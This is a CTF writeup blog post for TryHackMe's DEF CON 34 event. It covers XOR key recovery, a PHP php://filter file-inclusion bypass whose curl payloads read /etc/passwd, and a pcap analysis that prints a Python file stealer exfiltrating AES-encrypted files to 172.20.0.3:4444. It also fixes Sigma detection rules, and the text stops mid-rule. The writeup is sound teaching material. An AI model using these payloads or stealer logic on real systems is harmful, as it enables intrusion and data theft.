---
title: Overflow The Jackpot CTF
date: 08-05-2026
excerpt: TryHackMe Writeup
cover: ../uploads/cover_overflow.jpg
tags: XOR Decryption, AES, Splunk, CVE-2026-63030, Reverse Engineering
---

# Overflow: The Jackpot — DEF CON 34 CTF Writeup

Welcome back to another CTF writeup! This time I'm covering **Overflow: The Jackpot**, a special Capture The Flag event hosted by TryHackMe as part of the **DEF CON 34** season. DEF CON is one of the world's largest and most influential cybersecurity conferences, bringing together researchers, hackers, pentesters, students, and enthusiasts to compete, learn, and collaborate.

I hope this writeup is useful. Let's dive into the challenges and start hunting for flags!

## B1t Recovery (Crypto)

> A dealer at the back tables kept a private ledger locked away, scrambled before he vanished into the crowd. Security swept the floor after the fact and pulled a single scrambled file off his terminal, nothing else. The lock looks solid at a glance, but the house never spends more than it has to. See if you can shake the ledger loose and read what he was hiding.

We're given two files: `challenge.py` and `encrypted.bin`.

```python
import os
from pwn import *

key = os.urandom(4)
flag = b"THM{FAKE_FLAG_FOR_TESTING}" # fake flag, look at encrypted.bin and figure out the vulnerability in this encryption method.

encrypted = xor(flag, key)

with open("encrypted.bin", "wb") as f:
        f.write(encrypted)
```

### The Vulnerability

The encryption looks secure since `os.urandom()` generates the key randomly, but the key is only **4 bytes long**. Pwntools' `xor()` repeats the key to cover the full plaintext length, so the same 4 bytes get reused throughout the whole flag — e.g. key `ABCD` against `HELLOWORLD` lines up as:

```text
HELLOWORLD
ABCDABCDAB
```

Since every TryHackMe flag starts with `THM{`, we already know the first 4 plaintext bytes, so we can recover the key directly from `ciphertext XOR plaintext = key`.

### Solution

```python
from pwn import xor

with open("encrypted.bin", "rb") as f:
    enc = f.read()

key = bytes([
    enc[0] ^ ord('T'),
    enc[1] ^ ord('H'),
    enc[2] ^ ord('M'),
    enc[3] ^ ord('{')
])

flag = xor(enc, key)

print("[+] Key :", key.hex())
print("[+] Flag:", flag.decode())
```

XOR the first 4 ciphertext bytes with `THM{` to recover the key, then XOR the full ciphertext with that key to recover the flag. This works because the encryption is a short repeating XOR key paired with a predictable plaintext prefix.

```shell
┌──(kuroshiro㉿a1sberg)-[~/Downloads/b1t_recovery]
└─$ python3 solve.py
[+] Key : cbcece43
[+] Flag: THM{REDACTED}
```

## Lost Fortune Included (Web)

> The house always keeps a back room, and this one never quite closed its doors. Somewhere behind the neon and the noise sits a forgotten terminal, still quietly serving up files to anyone who knows how to ask nicely. Word on the floor is the old system trusts its visitors a little too much. Find the door, learn its language, and see what the dealer never meant to hand over.

We're given a web app URL.

![](https://kur0sh1r0.gitbook.io/ctf-writeups/~gitbook/image?url=https%3A%2F%2F271954773-files.gitbook.io%2F%7E%2Ffiles%2Fv0%2Fb%2Fgitbook-x-prod.appspot.com%2Fo%2Fspaces%252FYsivTjPn2jLXI0ZgVqeF%252Fuploads%252Fng9bN74HciVlRWubTp1c%252FScreenshot%2520%283035%29.png%3Falt%3Dmedia%26token%3Dba296280-b8aa-40d8-913d-c71f41ea1d21&width=768&dpr=3&quality=100&sign=16d820b5&sv=2)

Clicking `village_schedule.pdf` shows the interesting clue is in the URL parameters:

![](https://kur0sh1r0.gitbook.io/ctf-writeups/~gitbook/image?url=https%3A%2F%2F271954773-files.gitbook.io%2F%7E%2Ffiles%2Fv0%2Fb%2Fgitbook-x-prod.appspot.com%2Fo%2Fspaces%252FYsivTjPn2jLXI0ZgVqeF%252Fuploads%252FnnlY6bH9SnWO9HPJ4caS%252FScreenshot%2520%283036%29.png%3Falt%3Dmedia%26token%3De7140abf-ab6b-4cf3-a67b-6f79e37f986e&width=768&dpr=3&quality=100&sign=14454f51&sv=2)

### Confirming the Filter

I tested several path-traversal payloads with different encodings:

```shell
curl 'http://10.48.157.249/?doc=..%2f..%2f..%2fetc%2fpasswd'
curl 'http://10.48.157.249/?doc=....//....//etc/passwd'
curl 'http://10.48.157.249/?doc=..%252f..%252f..%252fetc%252fpasswd'
```

All variants returned the same error, so the filter wasn't an extension whitelist — it was specifically blacklisting `../`-style traversal sequences. Most standard testing led nowhere; the documents and web root were distractions. The real issue was in how the `doc` parameter itself was processed.

### The Bypass — PHP Stream Wrappers Contain No `../`

The blacklist only blocks traversal *patterns*, so any technique that reaches the file-reading function without using `../` slips through. PHP's `php://filter` wrapper fits perfectly — it can Base64-encode a file's contents via its `resource` parameter, with no traversal sequence involved:

```shell
┌──(kuroshiro㉿a1sberg)-[~/Downloads/DefCon]
└─$ curl 'http://10.48.157.249/?doc=php://filter/read=convert.base64-encode/resource=/etc/passwd'
cm9vdDp4OjA6MDpyb290Oi9yb290Oi9iaW4vYmFzaApkYWVtb246eDoxOjE6ZGFlbW9uOi91c3Ivc2Jpbj......
```

Decoded:

```shell
┌──(kuroshiro㉿a1sberg)-[~/Downloads/DefCon]
└─$ echo "cm9vdDp4OjA6MDpyb290Oi9yb290Oi9iaW4vYmFzaApkYWVtb246eDoxOjE6ZGFlbW9uOi91c...." | base64 -d
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
systemd-network:x:100:102:systemd Network Management,,,:/run/systemd:/usr/sbin/nologin
systemd-resolve:x:101:103:systemd Resolver,,,:/run/systemd:/usr/sbin/nologin
systemd-timesync:x:102:104:systemd Time Synchronization,,,:/run/systemd:/usr/sbin/nologin
messagebus:x:103:106::/nonexistent:/usr/sbin/nologin
syslog:x:104:110::/home/syslog:/usr/sbin/nologin
_apt:x:105:65534::/nonexistent:/usr/sbin/nologin
...
```

This confirmed arbitrary file read with the Apache/PHP process's privileges. The blacklist only checked for `../` patterns and never accounted for `php://` stream wrappers, a legitimate PHP feature that opened an unintended code path to user-controlled input.

### Getting the Flag

Reading other users' files failed due to OS permissions, so I pivoted to locations the web app itself could access — its own working directory rather than protected user paths.

```shell
┌──(kuroshiro㉿a1sberg)-[~/Downloads/DefCon]
└─$ curl 'http://10.48.157.249/?doc=php://filter/read=convert.base64-encode/resource=/var/www/flag.txt' | base64 -d
  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
                                 Dload  Upload   Total   Spent    Left  Speed
100    44  100    44    0     0    129      0 --:--:-- --:--:-- --:--:--   129
THM{REDACTED}
```

## Casino Heist (Forensics)

> Security noticed a quiet machine on the back office network acting strangely late one night. Before anyone could pull the plug, something had already come and gone, and whatever it grabbed on the way out went straight over the wire. The full capture from that night has been pulled for review. Somewhere in that traffic is the getaway car itself, and if you look close enough, it left the keys sitting right there on the dashboard.

We're given a `pcap` file.

### Protocol Overview

```shell
┌──(kuroshiro㉿a1sberg)-[~/Downloads/DefCon]
└─$ tshark -q -r stolen_jackpot.pcapng -z io,phs                                                                                                                                             

===================================================================
Protocol Hierarchy Statistics
Filter: 

eth                                      frames:701 bytes:20609026
  arp                                    frames:22 bytes:924
  ip                                     frames:679 bytes:20608102
    tcp                                  frames:661 bytes:20606338
      http                               frames:8 bytes:55145
        data-text-lines                  frames:3 bytes:1605
          tcp.segments                   frames:3 bytes:1605
        data                             frames:1 bytes:52890
          tcp.segments                   frames:1 bytes:52890
      data                               frames:2 bytes:222
    icmp                                 frames:18 bytes:1764
===================================================================
```

Most traffic is standard TCP/IP, with light ARP and ICMP alongside a small amount of HTTP. A few large data payloads stood out against the small HTTP packet count, hinting at file transfer — making HTTP the priority for investigation.

### Examining HTTP Traffic

```shell
┌──(kuroshiro㉿a1sberg)-[~/Downloads/DefCon]
└─$ tshark -r stolen_jackpot.pcapng -Y http -T fields -e frame.number -e ip.src -e ip.dst -e http.response.code -e http.content_type -e http.request.method -e http.request.uri             
22      172.20.0.1      172.20.0.2                      GET     /admin
26      172.20.0.2      172.20.0.1      404     text/html;charset=utf-8         /admin
34      172.20.0.1      172.20.0.2                      GET     /cms
38      172.20.0.2      172.20.0.1      404     text/html;charset=utf-8         /cms
46      172.20.0.1      172.20.0.2                      GET     /flag
50      172.20.0.2      172.20.0.1      404     text/html;charset=utf-8         /flag
76      172.20.0.1      172.20.0.2                      GET     /stealer
678     172.20.0.2      172.20.0.1      200     application/octet-stream                /stealer
```

Several endpoints were probed and returned 404 until `/stealer` succeeded with a 200 and `application/octet-stream` — a strong sign of a downloaded binary.

### Extracting and Inspecting the Binary

```shell
┌──(kuroshiro㉿a1sberg)-[~/Downloads/DefCon]
└─$ tshark -r stolen_jackpot.pcapng --export-objects http,objects                                                                                                                            
    1 0.000000000 36:df:25:53:0c:a2 → Broadcast    ARP 42 Who has 172.20.0.20? Tell 172.20.0.1
    2 1.002546334 36:df:25:53:0c:a2 → Broadcast    ARP 42 Who has 172.20.0.20? Tell 172.20.0.1
    3 2.026358710 36:df:25:53:0c:a2 → Broadcast    ARP 42 Who has 172.20.0.20? Tell 172.20.0.1
    4 3.050667740 36:df:25:53:0c:a2 → Broadcast    ARP 42 Who has 172.20.0.20? Tell 172.20.0.1
    5 4.074355962 36:df:25:53:0c:a2 → Broadcast    ARP 42 Who has 172.20.0.20? Tell 172.20.0.1
    6 5.098350881 36:df:25:53:0c:a2 → Broadcast    ARP 42 Who has 172.20.0.20? Tell 172.20.0.1
    7 6.122919869 36:df:25:53:0c:a2 → Broadcast    ARP 42 Who has 172.20.0.20? Tell 172.20.0.1
    8 7.146609303 36:df:25:53:0c:a2 → Broadcast    ARP 42 Who has 172.20.0.20? Tell 172.20.0.1
    9 8.170605713 36:df:25:53:0c:a2 → Broadcast    ARP 42 Who has 172.20.0.20? Tell 172.20.0.1
   10 8.667349331 36:df:25:53:0c:a2 → Broadcast    ARP 42 Who has 172.20.0.30? Tell 172.20.0.1
   ...
```

```shell
┌──(kuroshiro㉿a1sberg)-[~/Downloads/DefCon/objects]
└─$ ls -la
total 20100
drwxr-xr-x 2 kuroshiro kuroshiro     4096 Aug 13 02:04 .
drwxrwxr-x 3 kuroshiro kuroshiro     4096 Aug 13 02:04 ..
-rw-r--r-- 1 kuroshiro kuroshiro      469 Aug 13 02:04 admin
-rw-r--r-- 1 kuroshiro kuroshiro      469 Aug 13 02:04 cms
-rw-r--r-- 1 kuroshiro kuroshiro      469 Aug 13 02:04 flag
-rw-r--r-- 1 kuroshiro kuroshiro 20559968 Aug 13 02:04 stealer
```

`stealer` was by far the largest extracted file, making it the primary suspect.

```shell
┌──(kuroshiro㉿a1sberg)-[~/Downloads/DefCon/objects]
└─$ file stealer
stealer: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, for GNU/Linux 3.2.0, BuildID[sha1]=34f6ce77833f8dc35eb938b6683c0edc0292f637, stripped
```

It's a stripped 64-bit Linux ELF, dynamically linked — reverse engineering will be a bit harder without symbols.

```shell
┌──(kuroshiro㉿a1sberg)-[~/Downloads/DefCon/objects]
└─$ chmod +x stealer                                                                                                                                                                         

┌──(kuroshiro㉿a1sberg)-[~/Downloads/DefCon/objects]
└─$ ./stealer                                                                                                                                                                                

┌──(kuroshiro㉿a1sberg)-[~/Downloads/DefCon/objects]
└─$   
```

Running it produced no output, so I moved to static analysis. `strings` revealed Python runtime references throughout the binary:

```shell
┌──(kuroshiro㉿a1sberg)-[~/Downloads/DefCon/objects]
└─$ strings -a stealer                                                                                 
bossl-modules/legacy.so
bpython3.10/lib-dynload/_asyncio.cpython-310-x86_64-linux-gnu.so
bpython3.10/lib-dynload/_bz2.cpython-310-x86_64-linux-gnu.so
bpython3.10/lib-dynload/_codecs_cn.cpython-310-x86_64-linux-gnu.so
bpython3.10/lib-dynload/_codecs_hk.cpython-310-x86_64-linux-gnu.so
bpython3.10/lib-dynload/_codecs_iso2022.cpython-310-x86_64-linux-gnu.so
bpython3.10/lib-dynload/_codecs_jp.cpython-310-x86_64-linux-gnu.so
bpython3.10/lib-dynload/_codecs_kr.cpython-310-x86_64-linux-gnu.so
bpython3.10/lib-dynload/_codecs_tw.cpython-310-x86_64-linux-gnu.so
bpython3.10/lib-dynload/_contextvars.cpython-310-x86_64-linux-gnu.so
bpython3.10/lib-dynload/_ctypes.cpython-310-x86_64-linux-gnu.so
```

This suggests a PyInstaller-packaged Python app rather than native C/C++, so I focused on recovering the packaged Python code.

### Analyzing the Disassembled Malware

I extracted its contents with `pyinstxtractor`:

```shell
┌──(kuroshiro㉿a1sberg)-[~/Downloads/DefCon/objects]
└─$ pyinstxtractor stealer                                                                                                                                                                   
[+] Processing stealer
[+] Pyinstaller version: 2.1+
[+] Python version: 3.10
[+] Length of package: 20491578 bytes
[+] Found 198 files in CArchive
[+] Beginning extraction...please standby
[+] Possible entry point: pyiboot01_bootstrap.pyc
[+] Possible entry point: pyi_rth_inspect.pyc
[+] Possible entry point: pyi_rth_pkgutil.pyc
[+] Possible entry point: pyi_rth_multiprocessing.pyc
[+] Possible entry point: pyi_rth_glib.pyc
[+] Possible entry point: pyi_rth_gio.pyc
[+] Possible entry point: pyi_rth_gi.pyc
[+] Possible entry point: pyi_rth_cryptography_openssl.pyc
[+] Possible entry point: pyi_rth_setuptools.pyc
[+] Possible entry point: pyi_rth_pkgres.pyc
[+] Possible entry point: stealer.pyc
[!] Warning: This script is running in a different Python version than the one used to build the executable.
[!] Please run this script in Python 3.10 to prevent extraction errors during unmarshalling
[!] Skipping pyz extraction
[+] Successfully extracted pyinstaller archive: stealer

You can now use a python decompiler on the pyc files within the extracted directory
```

`stealer.pyc` looked like the main bytecode. Since it's Python 3.10 bytecode, standard decompilers weren't a fit, so I used `xdis` to disassemble it directly:

```shell
┌──(kuroshiro㉿a1sberg)-[~/Downloads/DefCon/objects/stealer_extracted]
└─$ python3                                                                                                                                                                                  
Python 3.13.14 (main, Jun 10 2026, 18:10:12) [GCC 15.2.0] on linux
Type "help", "copyright", "credits" or "license" for more information.
>>> import xdis
>>> xdis.disassemble_file('stealer.pyc')
# pydisasm version 6.3.0
# CPython Python bytecode 3.10 (3439)
#   Disassembled from CPython Python 3.13.14 (main, Jun 10 2026, 18:10:12) [GCC 15.2.0]
# Timestamp in code: 0 (1970-01-01 00:00:00)
# Source code size mod 2**32: 0 bytes
# Method Name:       <module>
# Filename:          stealer.py
# Argument count:    0
# Position-only argument count: 0
# Keyword-only arguments: 0
# Number of locals:  0
# Stack size:        2
# Flags:             0x00000040 (NOFREE)
# First Line:        1
# Constants:
#    0: 0
#    1: None
#    2: ('AES',)
#    3: ('pad',)
#    4: b'J4ckp0tH4ck3rKey'
#    5: b'Iv_For_Exf1ltr8!'
#    6: '172.20.0.3'
#    7: 4444
#    8: <Code310 code object run at 0x7f4dc9ddfa10, file stealer.py>, line 10
#    9: 'run'
# Names:
#    0: os
#    1: socket
#    2: Crypto.Cipher
#    3: AES
#    4: Crypto.Util.Padding
#    5: pad
#    6: KEY
#    7: IV
#    8: HOST
#    9: PORT
#   10: run

  1:           0 LOAD_CONST           (0)
               2 LOAD_CONST           (None)
               4 IMPORT_NAME          (os)
               6 STORE_NAME           (os)
               8 LOAD_CONST           (0)
              10 LOAD_CONST           (None)
              12 IMPORT_NAME          (socket)
              14 STORE_NAME           (socket)

  2:          16 LOAD_CONST           (0)
              18 LOAD_CONST           (('AES',))
              20 IMPORT_NAME          (Crypto.Cipher)
              22 IMPORT_FROM          (AES)
              24 STORE_NAME           (AES)
              26 POP_TOP

  3:          28 LOAD_CONST           (0)
              30 LOAD_CONST           (('pad',))
              32 IMPORT_NAME          (Crypto.Util.Padding)
              34 IMPORT_FROM          (pad)
              36 STORE_NAME           (pad)
              38 POP_TOP

  5:          40 LOAD_CONST           (b'J4ckp0tH4ck3rKey')
              42 STORE_NAME           (KEY)

  6:          44 LOAD_CONST           (b'Iv_For_Exf1ltr8!')
              46 STORE_NAME           (IV)

  7:          48 LOAD_CONST           ("172.20.0.3")
              50 STORE_NAME           (HOST)

  8:          52 LOAD_CONST           (4444)
              54 STORE_NAME           (PORT)

 10:          56 LOAD_CONST           (<Code310 code object run at 0x7f4dc9ddfa10, file stealer.py>, line 10)
              58 LOAD_CONST           ("run")
              60 MAKE_FUNCTION        (No arguments)
              62 STORE_NAME           (run)

 23:          64 LOAD_NAME            (run)
              66 CALL_FUNCTION        (0 positional arguments)
              68 POP_TOP
              70 LOAD_CONST           (None)
              72 RETURN_VALUE


# Method Name:       run
# Filename:          stealer.py
# Argument count:    0
# Position-only argument count: 0
# Keyword-only arguments: 0
# Number of locals:  7
# Stack size:        7
# Flags:             0x00000043 (NOFREE | NEWLOCALS | OPTIMIZED)
# First Line:        10
# Constants:
#    0: None
#    1: 'b0x'
#    2: '/home'
#    3: '.jackpot'
#    4: 'rb'
#    5: 16
#    6: b'\n'
# Names:
#    0: socket
#    1: gethostname
#    2: SystemExit
#    3: os
#    4: walk
#    5: endswith
#    6: open
#    7: path
#    8: join
#    9: read
#   10: AES
#   11: new
#   12: KEY
#   13: MODE_CBC
#   14: IV
#   15: encrypt
#   16: pad
#   17: connect
#   18: HOST
#   19: PORT
#   20: sendall
#   21: encode
#   22: close
# Varnames:
#       root, _, files, f, data, enc, s
# Local variables:
#    0: root
#    1: _
#    2: files
#    3: f
#    4: data
#    5: enc
#    6: s

 11:           0 LOAD_GLOBAL          (socket)
               2 LOAD_METHOD          (gethostname)
               4 CALL_METHOD          (0 positional arguments)
               6 LOAD_CONST           ("b0x")
               8 COMPARE_OP           (!=)
              10 POP_JUMP_IF_FALSE    (to 16)

 12:          12 LOAD_GLOBAL          (SystemExit)
              14 RAISE_VARARGS        (exception instance)

 14:     >>   16 LOAD_GLOBAL          (os)
              18 LOAD_METHOD          (walk)
              20 LOAD_CONST           ("/home")
              22 CALL_METHOD          (1 positional argument)
              24 GET_ITER
         >>   26 FOR_ITER             (to 162)
              28 UNPACK_SEQUENCE      3
              30 STORE_FAST           (root)
              32 STORE_FAST           (_)
              34 STORE_FAST           (files)

 15:          36 LOAD_FAST            (files)
              38 GET_ITER
         >>   40 FOR_ITER             (to 160)
              42 STORE_FAST           (f)

 16:          44 LOAD_FAST            (f)
              46 LOAD_METHOD          (endswith)
              48 LOAD_CONST           (".jackpot")
              50 CALL_METHOD          (1 positional argument)
              52 POP_JUMP_IF_FALSE    (to 158)

 17:          54 LOAD_GLOBAL          (open)
              56 LOAD_GLOBAL          (os)
              58 LOAD_ATTR            (path)
              60 LOAD_METHOD          (join)
              62 LOAD_FAST            (root)
              64 LOAD_FAST            (f)
              66 CALL_METHOD          (2 positional arguments)
              68 LOAD_CONST           ("rb")
              70 CALL_FUNCTION        (2 positional arguments)
              72 LOAD_METHOD          (read)
              74 CALL_METHOD          (0 positional arguments)
              76 STORE_FAST           (data)

 18:          78 LOAD_GLOBAL          (AES)
              80 LOAD_METHOD          (new)
              82 LOAD_GLOBAL          (KEY)
              84 LOAD_GLOBAL          (AES)
              86 LOAD_ATTR            (MODE_CBC)
              88 LOAD_GLOBAL          (IV)
              90 CALL_METHOD          (3 positional arguments)
              92 LOAD_METHOD          (encrypt)
              94 LOAD_GLOBAL          (pad)
              96 LOAD_FAST            (data)
              98 LOAD_CONST           (16)
             100 CALL_FUNCTION        (2 positional arguments)
             102 CALL_METHOD          (1 positional argument)
             104 STORE_FAST           (enc)

 19:         106 LOAD_GLOBAL          (socket)
             108 LOAD_METHOD          (socket)
             110 CALL_METHOD          (0 positional arguments)
             112 STORE_FAST           (s)

 20:         114 LOAD_FAST            (s)
             116 LOAD_METHOD          (connect)
             118 LOAD_GLOBAL          (HOST)
             120 LOAD_GLOBAL          (PORT)
             122 BUILD_TUPLE          2
             124 CALL_METHOD          (1 positional argument)
             126 POP_TOP

 21:         128 LOAD_FAST            (s)
             130 LOAD_METHOD          (sendall)
             132 LOAD_FAST            (f)
             134 LOAD_METHOD          (encode)
             136 CALL_METHOD          (0 positional arguments)
             138 LOAD_CONST           (b'\n')
             140 BINARY_ADD
             142 LOAD_FAST            (enc)
             144 BINARY_ADD
             146 CALL_METHOD          (1 positional argument)
             148 POP_TOP

 22:         150 LOAD_FAST            (s)
             152 LOAD_METHOD          (close)
             154 CALL_METHOD          (0 positional arguments)
             156 POP_TOP
         >>  158 JUMP_ABSOLUTE        (to 40)

 15:     >>  160 JUMP_ABSOLUTE        (to 26)

 14:     >>  162 LOAD_CONST           (None)
             164 RETURN_VALUE
```

The disassembly exposed hardcoded values: an AES key, an IV, and a remote host/port.

### Understanding the Malware's Logic

```python
KEY  = b'J4ckp0tH4ck3rKey'
IV   = b'Iv_For_Exf1ltr8!'
HOST = '172.20.0.3'
PORT = 4444
```

Reconstructed pseudocode:

```python
def run():
    if socket.gethostname() != 'b0x':
        raise SystemExit

    for root, _, files in os.walk('/home'):
        for f in files:
            if f.endswith('.jackpot'):
                data = open(os.path.join(root, f), 'rb').read()

                enc = AES.new(
                    KEY,
                    AES.MODE_CBC,
                    IV
                ).encrypt(pad(data, 16))

                s = socket.socket()
                s.connect((HOST, PORT))
                s.sendall(f.encode() + b'\n' + enc)
                s.close()
```

It's a hostname-gated (`b0x`) file stealer: it walks `/home` for `.jackpot` files, AES-CBC encrypts each with the hardcoded key/IV, and exfiltrates the filename + ciphertext to `172.20.0.3:4444`. Since the key and IV are embedded in the binary, captured traffic can be decrypted.

### Finding and Decrypting the Exfiltrated Data

Two outbound connections to `172.20.0.3:4444` matched the hardcoded destination:

![](https://kur0sh1r0.gitbook.io/ctf-writeups/~gitbook/image?url=https%3A%2F%2F271954773-files.gitbook.io%2F%7E%2Ffiles%2Fv0%2Fb%2Fgitbook-x-prod.appspot.com%2Fo%2Fspaces%252FYsivTjPn2jLXI0ZgVqeF%252Fuploads%252FafwraMJNPE7cPfUWefAD%252FScreenshot%2520%283039%29.png%3Falt%3Dmedia%26token%3Dbca69bf8-4e79-40ad-8400-d9dbcfaf0131&width=768&dpr=3&quality=100&sign=db5a3d2b&sv=2)

One stream had a much larger payload — the likely full file transfer. Following it raw:

```shell
┌──(kuroshiro㉿a1sberg)-[~/Downloads/DefCon]
└─$ tshark -r stolen_jackpot.pcapng -q -z follow,tcp,raw,4                                                                                                                                   

===================================================================
Follow: tcp,raw
Filter: tcp.stream eq 4
Node 0: 172.20.0.1:49496
Node 1: 172.20.0.3:4444
666c61672e6a61636b706f740a9bcc341f8374f7d031a5a0ee4663501313b15466b184e33a3f295efd0cd1b4f5c64b48dd831bbca7ec4423e3782f8fe5
===================================================================
```

Per the malware's `sendall()` format (`filename + b"\n" + encrypted_data`):

```text
666c61672e6a61636b706f740a  -> flag.jackpot\n
9bcc341f...8fe5             -> AES-CBC ciphertext
```

`decrypt.py`:

```python
from Crypto.Cipher import AES
from Crypto.Util.Padding import unpad

k = b'J4ckp0tH4ck3rKey'
v = b'Iv_For_Exf1ltr8!'

blob = bytes.fromhex(
    "666c61672e6a61636b706f740a9bcc341f8374f7d031a5a0ee4663501313b"
    "15466b184e33a3f295efd0cd1b4f5c64b48dd831bbca7ec4423e3782f8fe5"
)

_, ct = blob.split(b'\n', 1)

aes = AES.new(k, AES.MODE_CBC, v)
print(unpad(aes.decrypt(ct), AES.block_size))
```

```shell
┌──(kuroshiro㉿a1sberg)-[~/Downloads/DefCon]
└─$ python3 decrypt.py                                                                                                                                                                         
b'THM{REDACTED}'
```

## Fresh Powder (Detection Engineering)

This challenge provides an incident report from the TSS CSIRT team involving Cascadia Ski and Resort Collective, a hospitality org running three properties on shared infrastructure. The activity was attributed to **POWDER WOLF**, an eCrime group known for abusing stolen remote access credentials against hospitality targets. The attack progressed through most of the kill chain and was only caught during staging, before ransomware deployment — and only via CSIRT investigation rather than an existing alert, exposing detection gaps.

### Objectives

1. Review the attack chain in the incident report under `\threat-intel` on the Detection-as-Code (DaC) platform.
2. Determine why the CSIRT analyst's existing detections failed.
3. Research the adversary techniques used before fixing anything.
4. Account for the customer environment's operational quirks when tuning detections.
5. Update, refine, and merge the detection rules in the DaC app.

### Detection Pipeline

Each PR goes through: Sigma syntax check → conversion to Splunk via `sigma convert -t splunk` → validation against a known-good Splunk answer key → automated red-team bypass testing → peer review → merge approval.

### PR#1 — External RDP Logon From an Untrusted Source Grants Administrative Access

Detects interactive RDP logons carrying local admin rights from outside Cascadia's known internal/VPN/vendor ranges, matching POWDER WOLF's initial access tradecraft.

Original rule:

```yaml
title: External RDP Logon From an Untrusted Source Grants Administrative Access
id: fc14f8ac-c4d3-4071-b717-c2b85dc463d2
status: experimental
description: Detects an interactive RDP logon carrying local administrator rights, arriving from a source outside Cascadia's known internal, VPN, and vendor network ranges, on any host in the estate, consistent with POWDER WOLF's initial access tradecraft.
author: morgan-reyes
logsource:
  product: windows
  service: security

detection:
  selection:
    EventID: 4624
    LogonType: '10'
  filter_known_range:
    IpAddress|startswith: '203.0.113.'
  condition: selection and not filter_known_range
```

**Issue:** The exclusion filtered the *attacker's* network instead of Cascadia's trusted ranges — an accidental reversed allowlist that hid the actual compromise.

**Fix:** Rebuilt filtering from `docs/environment-routines.md`'s legitimate access patterns: internal admin traffic from `10.40.0.0/16` (IP-only), VPN access from `10.90.0.0/16` (IP + approved account), and SummitDesk MSP traffic from `198.51.100.0/24` (IP + service account) — account checks were required for VPN/MSP because the docs state IP alone isn't sufficient proof of legitimacy.

**Bypass found:** The rule only watched `LogonType 10` (new session), missing `LogonType 7` (unlock) reconnections from the same untrusted source. Both types are now monitored.

Solution:

```yaml
title: External RDP Logon From an Untrusted Source Grants Administrative Access
id: fc14f8ac-c4d3-4071-b717-c2b85dc463d2
status: experimental
description: Detects an interactive RDP logon on any host in the estate from a source outside Cascadia's known internal, VPN, and vendor routines, consistent with POWDER WOLF's initial access tradecraft.
author: morgan-reyes

logsource:
  product: windows
  service: security

detection:
  selection:
    EventID: 4624
    LogonType:
      - '10'
      - '7'

  filter_internal_hop:
    IpAddress|startswith: '10.40.'

  filter_vpn_authorized_staff:
    IpAddress|startswith: '10.90.'
    TargetUserName:
      - 'r.doyle'
      - 'k.nakamura'
      - 'p.okonkwo'

  filter_summitdesk_msp:
    IpAddress|startswith: '198.51.100.'
    TargetUserName: 'svc_summitdesk_support'

  condition: selection and not (filter_internal_hop or filter_vpn_authorized_staff or filter_summitdesk_msp)
```

Merge and we get the flag for PR#1.

### PR#2 — NetScan Enumerates Writable Administrative Shares via a Delete.me Access Test

Detects share access checks referencing a `delete.me` marker file, consistent with a scanner testing write access across admin shares during POWDER WOLF's discovery phase.

Original rule:

```yaml
title: NetScan Enumerates Writable Administrative Shares via a Delete.me Access Test
id: 9ab1b326-e9e3-4b6b-b4c2-81857d774b0b
status: experimental
description: Detects file share object access checks referencing a delete.me marker file, consistent with a network scanning tool testing write access across every discovered administrative share, part of POWDER WOLF's discovery phase following initial access.
author: morgan-reyes
logsource:
  product: windows
  service: security

detection:
  selection:
    EventID: 5145
    ShareName|endswith: 'delete.me'
  condition: selection
```

**Issue:** `ShareName` only holds the share path (e.g. `\\DC-CSRC01\C$`), not the accessed file — that's in `RelativeTargetName`. Checking the wrong field meant the rule never matched.

**Fix:** Match on `RelativeTargetName` instead. No exclusions were needed — per `environment-routines.md`, no legitimate process ever creates a `delete.me` artifact.

```yaml
detection:
  selection:
    EventID: 5145
    RelativeTargetName|endswith: 'delete.me'
  condition: selection
```

Solution:

```yaml
title: Detection of Delete.me File Probes Against Administrative Network Shares
id: 9ab1b326-e9e3-4b6b-b4c2-81857d774b0b
status: experimental
description: Identifies file share access events involving a file named "delete.me", a behavior commonly associated with automated tools validating write permissions on administrative shares during host and network reconnaissance activities.
author: morgan-reyes

logsource:
  product: windows
  service: security

detection:
  file_probe:
    EventID: 5145
    RelativeTargetName|endswith: 'delete.me'

  condition: file_probe
```

Merge and we get the flag for PR#2.

### PR#3 — Remote Access Tool Installed as a Service on Server Infrastructure

Detects a remote access tool installed as a Windows service on server-tier infrastructure — Cascadia's helpdesk only deploys these on workstations — consistent with POWDER WOLF's persistence on the domain controller.

Original rule:

```yaml
title: Remote Access Tool Installed as a Service on Server Infrastructure
id: 6e4f2418-b99a-4df2-868f-fe4086055996
status: experimental
description: Detects a remote access application installed as a Windows service on server tier infrastructure, where Cascadia's own helpdesk only ever deploys these tools on end user workstations, consistent with POWDER WOLF's persistence tradecraft on the domain controller.
author: morgan-reyes
logsource:
  product: windows
  service: security

detection:
  selection:
    Image|endswith: '\AnyDesk.exe'
  condition: selection
```

**Issues found:**

1. `Image|endswith` targets process-creation events, but the actual activity was a **service installation** (`EventID 7045`) — wrong event type entirely.
2. The rule ignored asset classification: workstations (`SNW-PC*`, `ALD-PC*`, `TBL-PC*`) are allowed to run these tools; servers aren't.
3. Switching to `ServiceFileName|endswith: '\AnyDesk.exe'` still failed, since real values included extra arguments (`...\AnyDesk.exe --service`) — needed `contains` instead of `endswith`.
4. The rule only covered AnyDesk; adversary testing showed the same technique via ScreenConnect and TeamViewer slipping through untouched.

**Fix:** Monitor `EventID 7045` and match multiple RAT tools with `contains`, excluding approved workstation classes.

```yaml
detection:
  selection:
